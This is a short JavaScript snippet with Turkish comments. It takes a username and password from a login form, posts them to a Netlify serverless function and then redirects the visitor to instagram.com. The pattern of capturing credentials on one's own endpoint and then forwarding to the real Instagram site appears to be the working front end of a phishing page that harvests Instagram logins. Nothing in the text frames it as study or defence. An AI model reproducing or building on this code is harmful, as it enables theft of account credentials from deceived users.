function sendMessage() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  fetch('/.netlify/functions/login', { // Serverless Function URL
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ username, password }),
  })
    .then(response => response.json())
    .then(data => {
      alert(data.message);
      window.location.replace('https://www.instagram.com'); // Başarılı giriş sonrası yönlendirme
    })
    .catch(error => {
      console.error('Hata:', error);
      alert("Bir hata oluştu. Lütfen tekrar deneyin.");
    });
}
